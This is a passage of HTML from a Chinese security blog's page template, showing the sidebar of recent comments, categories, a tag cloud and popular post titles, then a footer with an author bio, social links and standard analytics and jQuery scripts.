            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD.html">三个白帽</a>
        
        <a rel="tag" href="../tag/Mysql.html">Mysql</a>
        
        <a rel="tag" href="../tag/%E5%8A%A8%E7%BD%91.html">动网</a>
        
        <a rel="tag" href="../tag/Windows.html">Windows</a>
        
        <a rel="tag" href="../tag/python.html">python</a>
        
        <a rel="tag" href="../tag/%E8%87%AA%E5%8A%A8%E8%AE%BE%E7%BD%AE.html">自动设置</a>
        
        <a rel="tag" href="../tag/PPT.html">PPT</a>
        
        <a rel="tag" href="../tag/lnmp.html">lnmp</a>
        
        <a rel="tag" href="../tag/%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">参数注入漏洞</a>
        
        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
        
        <a rel="tag" href="../tag/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html">任意文件读取漏洞</a>
        
        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
        
        <a rel="tag" href="../tag/glassfish.html">glassfish</a>
        
        <a rel="tag" href="../tag/%E7%BB%87%E6%A2%A6.html">织梦</a>
        
        <a rel="tag" href="../tag/filter.html">filter</a>
        
        <a rel="tag" href="../tag/%E6%B5%8F%E8%A7%88%E5%99%A8.html">浏览器</a>
        
        <a rel="tag" href="../tag/freopen.html">freopen</a>
        
        <a rel="tag" href="../tag/%E5%8F%8D%E5%BC%B9shell.html">反弹shell</a>
        
        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
        
        <a rel="tag" href="../tag/firefox.html">firefox</a>
        
        <a rel="tag" href="../tag/XDCTF.html">XDCTF</a>
        
        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
        
        <a rel="tag" href="../tag/escapeshellarg.html">escapeshellarg</a>
        
        <a rel="tag" href="../tag/%E6%89%B9%E5%A4%84%E7%90%86.html">批处理</a>
        
        <a rel="tag" href="../tag/joomla.html">joomla</a>
        
        <a rel="tag" href="../tag/php.html">php</a>
        
        <a rel="tag" href="../tag/%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6.html">文件复制</a>
        
        <a rel="tag" href="../tag/Ubuntu.html">Ubuntu</a>
        
        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
        
        <a rel="tag" href="../tag/thinkphp.html">thinkphp</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">热门日志</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
    
        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
    
        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
    
        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon 非强迫症小青年  <br>
现居先 <br>
爱好：种花、买书、收藏明信片 <br>
欢迎各大组织收留 <br>
E-mail：root@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">更换模板</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top ↑</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>